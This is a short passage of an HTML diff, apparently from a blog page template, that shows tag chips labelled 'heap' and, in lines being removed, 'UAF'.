                         <span class="chip bg-color">heap</span>
-                    </a>
-                    
-                    <a href="/tags/UAF/">
-                        <span class="chip bg-color">UAF</span>
                     </a>
                     
                 </div>
